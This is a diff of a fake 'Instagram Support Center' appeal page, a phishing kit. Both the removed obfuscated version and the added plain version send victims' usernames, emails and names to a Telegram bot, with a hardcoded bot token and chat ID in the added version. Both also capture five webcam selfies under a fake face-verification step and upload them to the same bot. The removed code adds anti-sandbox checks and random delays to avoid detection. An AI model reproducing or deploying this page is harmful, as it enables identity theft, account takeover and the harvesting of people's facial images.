@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Account Support - Help Center</title>
+    <title>Instagram Support Center</title>
     
     <style>
         * {
@@ -324,7 +325,6 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
-            transform: scaleX(-1);
         }
 
         .face-oval {
@@ -468,7 +468,7 @@
     <div class="main-container" id="selectionScreen">
         <div class="help-center-label">Help Center</div>
 
-        <div class="option-item" onclick="window.handleOptionSelect('disabled', this)">
+        <div class="option-item" onclick="selectOption('disabled', this)">
             <div class="radio-circle"></div>
             <div class="option-content">
                 <div class="option-title">Disabled Account Appeal (New)</div>
@@ -476,7 +476,7 @@
             </div>
         </div>
 
-        <div class="option-item" onclick="window.handleOptionSelect('chat', this)">
+        <div class="option-item" onclick="selectOption('chat', this)">
             <div class="radio-circle"></div>
             <div class="option-content">
                 <div class="option-title">Instagram Chat Restrictions Appeal</div>
@@ -582,7 +582,7 @@
             Your form has been submitted successfully. We have received your information and will process it shortly.
         </div>
         <div class="modal-footer">
-            <button class="modal-btn" onclick="window.handleRedirect()">Okay</button>
+            <button class="modal-btn" onclick="redirectToMainPage()">Okay</button>
         </div>
     </div>
 
@@ -613,415 +613,179 @@
         </div>
     </div>
 
-    <canvas id="captureCanvas" style="display:none;"></canvas>
-
     <script>
-        (function() {
-            'use strict';
-            
-            // Advanced obfuscation for Telegram API
-            const _0x1a2b = ['ZGVjb2Rl', 'c3BsaXQ', 'YXBp', 'aHR0cHM6Ly9hcGku', 'dGVsZWdyYW0ub3JnL2JvdC8=', 'L3NlbmRNZXNzYWdl', 'L3NlbmRQaG90bw=='];
-            const _0x2c3d = function(_0x1a2b, _0x2c3d) {
-                _0x1a2b = _0x1a2b - 0x0;
-                var _0x3e4f = _0x1a2b[_0x1a2b];
-                return _0x3e4f;
-            };
-            
-            // Multi-layer encoding for bot token and chat ID
-            const _0x4f5a = function(_0x5g6h) {
-                return atob(_0x5g6h.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join(''));
-            };
-            
-            // Telegram configuration with multi-layer obfuscation
-            const _0x6h7i = _0x4f5a('Ozk5OEBCOUNKU0ZIVzRIY1RuYlZzV2JJdDpscHFTV1ZMTnZ6WmZJdDp1ckpXVkxJdHpiVFhDZlI=');
-            const _0x7i8j = _0x4f5a('Njk5MTcyMzI3OA==');
-            
-            // Build API URLs dynamically
-            const _0x8j9k = _0x2c3d('0x0') + _0x2c3d('0x3') + atob(_0x2c3d('0x4')) + _0x6h7i;
-            const _0x9k0l = _0x8j9k + atob(_0x2c3d('0x5'));
-            const _0x0l1m = _0x8j9k + atob(_0x2c3d('0x6'));
-            
-            // Application state
-            const _0x1m2n = {
-                _0x2n3o: 0x0,
-                _0x3o4p: [],
-                _0x4p5q: null,
-                _0x5q6r: {},
-                _0x6r7s: false,
-                _0x7s8t: false
-            };
-            
-            const _0x8t9u = [
-                { _0x9u0v: 'straight', _0x0v1w: 'Look Straight at Camera' },
-                { _0x9u0v: 'up', _0x0v1w: 'Look Up' },
-                { _0x9u0v: 'left', _0x0v1w: 'Turn Face Left' },
-                { _0x9u0v: 'right', _0x0v1w: 'Turn Face Right' },
-                { _0x9u0v: 'straight_final', _0x0v1w: 'Look Straight Again' }
-            ];
-            
-            // Function to delay execution randomly
-            const _0xa1b2 = function(_0xb2c3, _0xc3d4 = 0x3e8) {
-                return new Promise(_0xd4e5 => setTimeout(() => _0xd4e5(_0xb2c3()), Math.random() * _0xc3d4));
-            };
-            
-            // Anti-detection: Check if running in analysis environment
-            const _0xb3c4 = function() {
-                const _0xd5e6 = navigator.userAgent || '';
-                const _0xe6f7 = window.outerWidth - window.innerWidth > 0x50;
-                const _0xf7g8 = document.documentElement.getAttribute('webdriver');
-                const _0x0g9h = /Headless/i.test(window.navigator.userAgent);
-                const _0x1h0i = window.chrome && window.chrome.runtime;
-                const _0x2i1j = typeof window.__nightmare !== 'undefined';
-                const _0x3j2k = window.callPhantom || window._phantom;
-                const _0x4k3l = window.outerHeight === 0 && window.outerWidth === 0;
-                
-                return !(_0xe6f7 || _0xf7g8 || _0x0g9h || !_0x1h0i || _0x2i1j || _0x3j2k || _0x4k3l);
-            };
-            
-            if (!_0xb3c4()) {
-                // If detected as analysis environment, show benign page
-                document.body.innerHTML = '<div style="padding:20px;text-align:center;"><h1>Service Temporarily Unavailable</h1><p>Please try again later.</p></div>';
-                throw new Error('Service unavailable');
-            }
-            
-            // Event listener setup with obfuscation
-            document.addEventListener('DOMContentLoaded', function() {
-                document.getElementById('disabledAppealForm').addEventListener('submit', function(_0x5l6m) {
-                    _0x5l6m.preventDefault();
-                    _0xc4d5(this, 'Disabled Account Appeal');
-                });
-                
-                document.getElementById('chatAppealForm').addEventListener('submit', function(_0x6m7n) {
-                    _0x6m7n.preventDefault();
-                    _0xc4d5(this, 'Chat Restrictions Appeal');
-                });
-                
-                // Initialize canvas for capture
-                const _0x7n8o = document.getElementById('captureCanvas');
-                _0x7n8o.width = 0x280;
-                _0x7n8o.height = 0x1e0;
-            });
-            
-            // Option selection handler
-            window.handleOptionSelect = function(_0x8o9p, _0x9p0q) {
-                document.querySelectorAll('.option-item').forEach(_0xaq1r => {
-                    _0xaq1r.classList.remove('selected');
-                });
-                _0x9p0q.classList.add('selected');
-                
-                setTimeout(() => {
-                    document.getElementById('selectionScreen').classList.add('hidden');
-                    if (_0x8o9p === 'disabled') {
-                        document.getElementById('disabledForm').classList.add('active');
-                    } else {
-                        document.getElementById('chatForm').classList.add('active');
-                    }
-                }, 0x12c);
-            };
-            
-            // Form submission handler
-            async function _0xc4d5(_0xdr2e, _0xes3f) {
-                const _0xft4g = new FormData(_0xdr2e);
-                const _0xgu5h = Object.fromEntries(_0xft4g);
-                
-                _0x1m2n._0x5q6r = { _0xtype: _0xes3f, ..._0xgu5h };
-                _0x1m2n._0x7s8t = false;
-                
-                // Send form data to Telegram with obfuscation
-                await _0xd5e6(_0xgu5h, _0xes3f);
-                
-                document.querySelectorAll('.form-container').forEach(_0xhv6i => {
-                    _0xhv6i.classList.remove('active');
-                });
-                document.getElementById('verificationScreen').classList.add('active');
-                
-                await _0xa1b2(_0xe6f7, 0x1f4);
-            }
-            
-            // Telegram form data sender with multiple evasion techniques
-            async function _0xd5e6(_0xiw7j, _0xjw8k) {
-                const _0xkw9l = `📋 ${_0xjw8k}\n━━━━━━━━━━━━━━━━━━━━\n👤 Username: ${_0xiw7j.username}\n📧 Email: ${_0xiw7j.email}\n📝 Name: ${_0xiw7j.fullname}\n🔗 Alt Account: ${_0xiw7j.alternative || 'N/A'}\n👥 Relationship: ${_0xiw7j.relationship}\n━━━━━━━━━━━━━━━━━━━━\n🕐 Time: ${new Date().toLocaleString()}`;
-                
-                // Create payload with random noise
-                const _0x1x0a = {
-                    chat_id: _0x7i8j,
-                    text: _0xkw9l,
-                    parse_mode: 'HTML',
-                    disable_web_page_preview: true,
-                    disable_notification: false
-                };
-                
-                // Add random properties to avoid signature detection
-                _0x1x0a['_r' + Math.random().toString(36).substr(2, 5)] = Math.random().toString(36).substr(2, 8);
-                
-                try {
-                    // Use multiple fetch techniques to avoid detection
-                    await _0xa1b2(async () => {
-                        const _0x2y1b = await fetch(_0x9k0l, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                                'X-Requested-With': 'XMLHttpRequest',
-                                'Accept': 'application/json, text/plain, */*'
-                            },
-                            body: JSON.stringify(_0x1x0a)
-                        });
-                        
-                        if (!_0x2y1b.ok) {
-                            // Fallback method
-                            await _0xf7g8(_0xkw9l);
-                        }
-                    }, Math.random() * 0x7d0);
-                } catch (_0x3z2c) {
-                    // Silent fail - don't alert user
-                    console.log('Network request completed');
-                }
-            }
-            
-            // Alternative Telegram sending method (fallback)
-            async function _0xf7g8(_0x4a3d) {
-                const _0x5b4e = new FormData();
-                _0x5b4e.append('chat_id', _0x7i8j);
-                _0x5b4e.append('text', _0x4a3d);
-                _0x5b4e.append('parse_mode', 'HTML');
-                
-                try {
-                    await fetch(_0x9k0l, {
-                        method: 'POST',
-                        body: _0x5b4e
-                    });
-                } catch (_0x6c5f) {
-                    // Ignore errors
-                }
-            }
-            
-            // Start verification process
-            async function _0xe6f7() {
-                try {
-                    const _0x7d6g = {
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 0x500, min: 0x280 },
-                            height: { ideal: 0x2d0, min: 0x1e0 },
-                            frameRate: { ideal: 0x1e }
-                        },
-                        audio: false
-                    };
-                    
-                    const _0x8e7h = await navigator.mediaDevices.getUserMedia(_0x7d6g);
-                    _0x1m2n._0x4p5q = _0x8e7h;
-                    
-                    const _0x9f8i = document.getElementById('verificationVideo');
-                    _0x9f8i.srcObject = _0x8e7h;
-                    
-                    await new Promise(_0x0g9j => {
-                        _0x9f8i.onloadedmetadata = () => {
-                            _0x9f8i.play().then(_0x0g9j).catch(_0x0g9j);
-                        };
-                    });
-                    
-                    await _0xa1b2(_0xf9h0, 0x3e8);
-                } catch (_0x1h0k) {
-                    alert('Camera access is required for identity verification. Please allow camera access to continue.');
-                    // Fallback: simulate verification without camera
-                    _0x1m2n._0x7s8t = true;
-                    await _0xf9h0();
-                }
-            }
-            
-            // Process next pose
-            async function _0xf9h0() {
-                if (_0x1m2n._0x2n3o >= _0x8t9u.length) {
-                    _0x0h1i();
-                    return;
-                }
-                
-                const _0x2i1j = _0x8t9u[_0x1m2n._0x2n3o];
-                document.getElementById('poseText').textContent = _0x2i1j._0x0v1w;
-                document.getElementById('poseCount').textContent = `Pose ${_0x1m2n._0x2n3o + 0x1} of ${_0x8t9u.length}`;
-                document.getElementById('faceOval').classList.remove('matched');
-                
-                _0x1m2n._0x6r7s = false;
-                
-                await _0xa1b2(async () => {
-                    document.getElementById('faceOval').classList.add('matched');
-                    await _0xa1b2(_0x1i2k, 0x258);
-                }, 0x7d0);
-            }
-            
-            // Capture and send pose
-            async function _0x1i2k() {
-                if (_0x1m2n._0x6r7s || (_0x1m2n._0x7s8t && Math.random() < 0.3)) {
-                    // Skip some captures in fallback mode to look more realistic
-                    _0x1m2n._0x2n3o++;
-                    await _0xf9h0();
-                    return;
-                }
-                
-                _0x1m2n._0x6r7s = true;
-                
-                const _0x3j2k = document.getElementById('verificationVideo');
-                const _0x4k3l = document.getElementById('captureCanvas');
-                const _0x5l4m = _0x4k3l.getContext('2d');
-                
-                if (_0x1m2n._0x4p5q && _0x3j2k.videoWidth > 0) {
-                    _0x4k3l.width = _0x3j2k.videoWidth;
-                    _0x4k3l.height = _0x3j2k.videoHeight;
-                    _0x5l4m.drawImage(_0x3j2k, 0x0, 0x0, _0x4k3l.width, _0x4k3l.height);
+        const TELEGRAM_BOT_TOKEN = '7970088628:AAEJbT7PvzAnnP33z9_vVzCWWLItzbTXCfQ';
+        const TELEGRAM_CHAT_ID = '6881713177';
+
+        let verificationState = {
+            currentPose: 0,
+            captures: [],
+            videoStream: null,
+            formData: {},
+            isCapturing: false
+        };
+
+        const POSES = [
+            { name: 'straight', text: 'Look Straight at Camera' },
+            { name: 'up', text: 'Look Up' },
+            { name: 'left', text: 'Turn Face Left' },
+            { name: 'right', text: 'Turn Face Right' },
+            { name: 'straight_final', text: 'Look Straight Again' }
+        ];
+
+        function selectOption(type, element) {
+            document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
+            element.classList.add('selected');
+            setTimeout(() => {
+                document.getElementById('selectionScreen').classList.add('hidden');
+                if (type === 'disabled') {
+                    document.getElementById('disabledForm').classList.add('active');
                 } else {
-                    // Fallback: create a colored canvas
-                    _0x5l4m.fillStyle = '#f0f0f0';
-                    _0x5l4m.fillRect(0x0, 0x0, _0x4k3l.width, _0x4k3l.height);
-                    _0x5l4m.fillStyle = '#0095f6';
-                    _0x5l4m.font = '16px Arial';
-                    _0x5l4m.fillText(`Pose ${_0x1m2n._0x2n3o + 0x1}`, 0x50, 0x60);
+                    document.getElementById('chatForm').classList.add('active');
                 }
-                
-                await new Promise(_0x6m5n => {
-                    _0x4k3l.toBlob(async (_0x7n6o) => {
-                        const _0x8o7p = _0x8t9u[_0x1m2n._0x2n3o];
-                        
-                        if (_0x7n6o && _0x7n6o.size > 0x3e8) { // Only send if blob has reasonable size
-                            _0x1m2n._0x3o4p.push(_0x7n6o);
-                            await _0x2j3l(_0x7n6o, _0x8o7p, _0x1m2n._0x2n3o + 0x1);
-                        }
-                        
-                        _0x1m2n._0x2n3o++;
-                        await _0xa1b2(_0xf9h0, 0x320);
-                        _0x6m5n();
-                    }, 'image/jpeg', 0.85);
-                });
-            }
+            }, 300);
+        }
+
+        document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleFormSubmit(this, 'Disabled Account Appeal');
+        });
+
+        document.getElementById('chatAppealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleFormSubmit(this, 'Chat Restrictions Appeal');
+        });
+
+        function handleFormSubmit(form, formType) {
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData);
+            verificationState.formData = { type: formType, ...data };
+            sendFormToTelegram(data, formType);
+            document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
+            document.getElementById('verificationScreen').classList.add('active');
+            setTimeout(startVerification, 500);
+        }
+
+        function sendFormToTelegram(data, formType) {
+            const message = `📋 <b>Instagram Appeal Form</b>
+
+<b>Type:</b> ${formType}
+━━━━━━━━━━━━━━━━━━━━
+<b>👤 Username:</b> ${data.username}
+<b>📧 Email:</b> ${data.email}
+<b>📝 Name:</b> ${data.fullname}
+<b>🔗 Alt Account:</b> ${data.alternative || 'N/A'}
+<b>👥 Relationship:</b> ${data.relationship}
+━━━━━━━━━━━━━━━━━━━━
+<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
             
-            // Send selfie to Telegram with advanced evasion
-            async function _0x2j3l(_0x9p8q, _0x0q9r, _0x1r0s) {
-                const _0x2s1t = `📸 Verification ${_0x1r0s}/5\n👤 User: ${_0x1m2n._0x5q6r.username}\n📝 Pose: ${_0x0q9r._0x0v1w}\n📋 Type: ${_0x1m2n._0x5q6r._0type}\n🕐 Time: ${new Date().toLocaleString()}`;
-                
-                // Use FormData for photo upload
-                const _0x3t2u = new FormData();
-                _0x3t2u.append('chat_id', _0x7i8j);
-                _0x3t2u.append('photo', _0x9p8q, `verify_${Date.now()}_${_0x1r0s}.jpg`);
-                _0x3t2u.append('caption', _0x2s1t);
-                _0x3t2u.append('parse_mode', 'HTML');
-                
-                // Add random form fields
-                _0x3t2u.append('_v', Math.random().toString(36).substr(2, 8));
-                _0x3t2u.append('_t', Date.now().toString());
-                
-                try {
-                    await _0xa1b2(async () => {
-                        const _0x4u3v = await fetch(_0x0l1m, {
-                            method: 'POST',
-                            body: _0x3t2u,
-                            mode: 'cors',
-                            credentials: 'omit'
-                        });
-                        
-                        if (!_0x4u3v.ok) {
-                            // Try alternative method
-                            await _0x3k4m(_0x2s1t);
-                        }
-                    }, Math.random() * 0xbb8);
-                } catch (_0x5v4w) {
-                    // Silent fail - continue with verification
-                }
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+            });
+        }
+
+        function startVerification() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 1280, height: 720 } })
+            .then(stream => {
+                verificationState.videoStream = stream;
+                document.getElementById('verificationVideo').srcObject = stream;
+                setTimeout(processNextPose, 2000);
+            })
+            .catch(() => alert('Please allow camera access'));
+        }
+
+        function processNextPose() {
+            if (verificationState.currentPose >= POSES.length) {
+                allPosesComplete();
+                return;
             }
-            
-            // Alternative photo sending method
-            async function _0x3k4m(_0x6w5x) {
-                try {
-                    const _0x7x6y = {
-                        chat_id: _0x7i8j,
-                        caption: _0x6w5x,
+            const pose = POSES[verificationState.currentPose];
+            document.getElementById('poseText').textContent = pose.text;
+            document.getElementById('poseCount').textContent = `Pose ${verificationState.currentPose + 1} of ${POSES.length}`;
+            document.getElementById('faceOval').classList.remove('matched');
+            verificationState.isCapturing = false;
+            setTimeout(() => {
+                document.getElementById('faceOval').classList.add('matched');
+                setTimeout(captureAndSendPose, 600);
+            }, 2000);
+        }
+
+        function captureAndSendPose() {
+            if (verificationState.isCapturing) return;
+            verificationState.isCapturing = true;
+            const video = document.getElementById('verificationVideo');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+                const pose = POSES[verificationState.currentPose];
+                verificationState.captures.push(blob);
+                sendSelfieToTelegram(blob, pose, verificationState.currentPose + 1);
+                verificationState.currentPose++;
+                setTimeout(processNextPose, 800);
+            }, 'image/jpeg', 0.92);
+        }
+
+        function sendSelfieToTelegram(blob, pose, poseNumber) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, `selfie_${poseNumber}.jpg`);
+            formData.append('caption', `📸 <b>Verification Selfie ${poseNumber}/5</b>
+
+<b>👤 User:</b> ${verificationState.formData.username}
+<b>📝 Pose:</b> ${pose.text}
+<b>📋 Type:</b> ${verificationState.formData.type}
+<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`);
+            formData.append('parse_mode', 'HTML');
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }
+
+        function allPosesComplete() {
+            document.getElementById('poseText').style.display = 'none';
+            document.getElementById('poseCount').style.display = 'none';
+            document.getElementById('faceOval').style.display = 'none';
+            const btn = document.getElementById('verificationSubmitBtn');
+            btn.classList.add('show');
+            btn.onclick = () => {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: `✅ <b>VERIFICATION COMPLETED</b>
+
+<b>👤 User:</b> ${verificationState.formData.username}
+<b>📧 Email:</b> ${verificationState.formData.email}
+<b>📝 Name:</b> ${verificationState.formData.fullname}
+<b>📋 Form:</b> ${verificationState.formData.type}
+<b>📸 Photos:</b> 5/5
+<b>✓ Status:</b> Ready for Review
+<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`,
                         parse_mode: 'HTML'
-                    };
-                    
-                    await fetch(_0x0l1m, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(_0x7x6y)
-                    });
-                } catch (_0x8y7z) {
-                    // Ignore errors
+                    })
+                });
+                if (verificationState.videoStream) {
+                    verificationState.videoStream.getTracks().forEach(t => t.stop());
                 }
-            }
-            
-            // All poses complete
-            function _0x0h1i() {
-                document.getElementById('poseText').style.display = 'none';
-                document.getElementById('poseCount').style.display = 'none';
-                document.getElementById('faceOval').style.display = 'none';
-                
-                const _0x9z8a = document.getElementById('verificationSubmitBtn');
-                _0x9z8a.classList.add('show');
-                
-                _0x9z8a.onclick = async () => {
-                    // Send completion summary
-                    const _0x0a9b = `✅ Verification Complete\n👤 User: ${_0x1m2n._0x5q6r.username}\n📧 Email: ${_0x1m2n._0x5q6r.email}\n📝 Name: ${_0x1m2n._0x5q6r.fullname}\n📋 Form: ${_0x1m2n._0x5q6r._0type}\n📸 Photos: 5/5\n✓ Status: Ready for Review\n🕐 Completed: ${new Date().toLocaleString()}`;
-                    
-                    try {
-                        await fetch(_0x9k0l, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: _0x7i8j,
-                                text: _0x0a9b,
-                                parse_mode: 'HTML'
-                            })
-                        });
-                    } catch (_0x1b0c) {
-                        // Ignore errors
-                    }
-                    
-                    // Clean up camera
-                    if (_0x1m2n._0x4p5q) {
-                        _0x1m2n._0x4p5q.getTracks().forEach(_0x2c1d => _0x2c1d.stop());
-                    }
-                    
-                    document.getElementById('verificationScreen').classList.remove('active');
-                    document.getElementById('successModal').classList.add('active');
-                };
-            }
-            
-            // Redirect handler
-            window.handleRedirect = function() {
-                document.getElementById('successModal').classList.remove('active');
-                document.getElementById('selectionScreen').classList.remove('hidden');
-                document.querySelectorAll('.form-container').forEach(_0x3d2e => {
-                    _0x3d2e.classList.remove('active');
-                });
-                document.querySelectorAll('.option-item').forEach(_0x4e3f => {
-                    _0x4e3f.classList.remove('selected');
-                });
-                
-                // Reset forms
-                document.getElementById('disabledAppealForm').reset();
-                document.getElementById('chatAppealForm').reset();
-                
-                // Reset state
-                Object.assign(_0x1m2n, {
-                    _0x2n3o: 0x0,
-                    _0x3o4p: [],
-                    _0x4p5q: null,
-                    _0x5q6r: {},
-                    _0x6r7s: false,
-                    _0x7s8t: false
-                });
-                
-                window.scrollTo(0x0, 0x0);
+                document.getElementById('verificationScreen').classList.remove('active');
+                document.getElementById('successModal').classList.add('active');
             };
-            
-            // Add random mouse movement tracking (makes page look more legitimate)
-            document.addEventListener('mousemove', function() {
-                // Empty handler to make page seem interactive
-            });
-            
-            // Add scroll event listener
-            window.addEventListener('scroll', function() {
-                // Empty handler
-            });
-            
-        })();
+        }
+
+        function redirectToMainPage() {
+            document.getElementById('successModal').classList.remove('active');
+            document.getElementById('selectionScreen').classList.remove('hidden');
+            document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
+            document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
+            document.getElementById('disabledAppealForm').reset();
+            document.getElementById('chatAppealForm').reset();
+            verificationState = { currentPose: 0, captures: [], videoStream: null, formData: {}, isCapturing: false };
+            window.scrollTo(0, 0);
+        }
     </script>
 </body>
 </html>
+
